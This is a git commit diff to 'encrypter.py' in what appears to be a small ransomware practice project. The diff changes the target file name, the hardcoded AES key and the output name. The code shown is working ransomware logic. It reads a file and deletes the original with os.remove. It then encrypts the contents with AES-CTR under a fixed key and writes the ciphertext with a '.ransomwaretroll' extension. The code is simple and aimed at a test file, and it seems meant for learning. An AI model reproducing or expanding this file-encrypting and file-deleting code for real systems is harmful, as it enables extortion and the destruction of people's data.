d98b3553bd2202c352f27e2b097a3e921c6c6a30
Flávio Araújo <96846477+flaviohcampp@users.noreply.github.com>
2024-12-09 08:59:59 -0300

    Update encrypter.py

--- encrypter.py
+++ encrypter.py
@@ -1,14 +1,14 @@
 import os
 import pyaes
-file_name = "teste.txt"
+file_name = "teste_encrypter.txt"
 file = open(file_name, "rb")
 file_data = file.read()
 file.close()
 os.remove(file_name)
-key = b"testeransomwares"
+key = b"testeparadiorans"
 aes = pyaes.AESModeOfOperationCTR(key)
 crypto_data = aes.encrypt(file_data)
-new_file = file_name + ".ransomwaretroll"
+new_file = "teste_decrypter.txt" + ".ransomwaretroll"
 new_file = open(f'{new_file}','wb')
 new_file.write(crypto_data)
 new_file.close()
